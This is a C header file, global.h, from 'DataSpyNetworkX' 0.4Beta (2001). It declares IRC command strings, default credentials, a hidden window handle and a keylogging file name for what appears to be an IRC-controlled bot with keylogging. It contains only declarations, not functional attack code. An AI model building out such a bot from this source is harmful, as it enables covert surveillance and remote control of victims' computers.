/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#ifndef _INC__GLOBAL_H__
#define _INC__GLOBAL_H__

#define MAX_BUFFER_LEN 1024
#define MY_MESSAGE_STARTS_AT WM_USER + 1

#define _DSNX_DEFAULT_UANDP_ d_USR,d_USR
#define PORTOPERATIONSLEEPTIME 50

#include <windows.h>
#include <stdio.h>
#include "main.h"

extern HWND g_hwnd;
extern char *g_EXEName;
//extern BOOL g_IsWinNT;

extern char c_JOIN[]; 
extern char c_PART[]; 
extern char c_NICK[]; 
extern char c_PRIVMSG[];
extern char c_NOTICE[];
extern char c_NICKSERV[];
extern char c_CHANSERV[];
extern char c_QUITMSG[];
extern char c_VERSION[];
extern char d_USR[];
extern char c_DOUBLE_STRINGS[];
extern char c_KEYLOGGING_FILE[];

extern char c_OUT_OF_IOHANDLERS[];
extern char c_STOPPED[];
extern char c_STARTED[];

extern long l_UP;

#define _DSNX_VERSION c_VERSION
#define r_CHANNEL 'c'
#define r_QUERY   'q'
#define r_NOTICE  'n'

//extern char *g_cSList[5][25];
//extern int g_iSList[5];

#endif //__GLOBAL_H